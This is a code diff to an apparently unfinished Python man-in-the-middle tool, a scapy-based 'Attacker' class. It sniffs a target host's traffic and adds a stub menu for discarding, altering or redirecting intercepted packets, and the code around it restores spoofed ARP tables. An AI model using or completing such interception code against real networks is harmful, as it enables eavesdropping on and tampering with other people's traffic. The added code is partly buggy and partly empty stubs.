@@ -25,12 +25,39 @@ class Attacker:
         self.s.restore(self.targetIP, self.gatewayIP)
         self.s.restore(self.gatewayIP, self.targetIP)
 
+    def packet_interact(self, packet):
+        """This Func will either discard alter or let the packet go depending on input"""
+        # TODO: before action i need to build the packet and present it to the attacker maybe packet.summary()?
+        print(packet.summary)
+        regex = " |"  # maybe can remodel to another input in the action themselves
+        action = input("Desired action: ")  # block function
+        if action == "Help" or action == "help":
+            print("Discard -> destroy the packet")
+            print("Alter -> change the value of the packet then send it to same address")
+            print("Redirect -> send the same packet to another ip")
+            print("RedirectA -> change the value of the packet then send the packet to another ip")
+            print("If nothing is entered the packet will go to the desired address")
+        action = action.split(regex)
+        if action[0] == "Discard":  # destroy the packet
+            pass
+        if action[0] == "Alter":  # change the value of the packet then send it to same address
+            pass
+        if action[0] == "Redirect":  # send the same packet to another ip
+            pass
+        if action[0] == "RedirectA":  # change the value of the packet then send the packet to another ip
+            pass
+        else:
+            print("y?")
+        pass
+
     def harvest_packets(self):
         """This Func will present the relevant network traffic"""
-        filter_param = "Host" + str(self.targetIP)  # his will be the filter for the scapy that runs from attacker pc
+        # sniff() uses Berkeley Packet Filter (BPF) syntax
+        filter_param = "host" + " " + self.targetIP  # This will be the filter for the scapy that runs from attacker pc
         while 'sniffing':
-            pkt = scapy.sniff(filter=filter_param, count=1)  # filter will use self.target_ip
-            print(pkt[0])
+            pkt = scapy.sniff(filter=filter_param, count=1, prn=self.packet_interact)  # filter will use self.target_ip
+            # prn is  what func to apply to each packet
+            # print(pkt[0])
             time.sleep(0.5)
 
     def main(self):
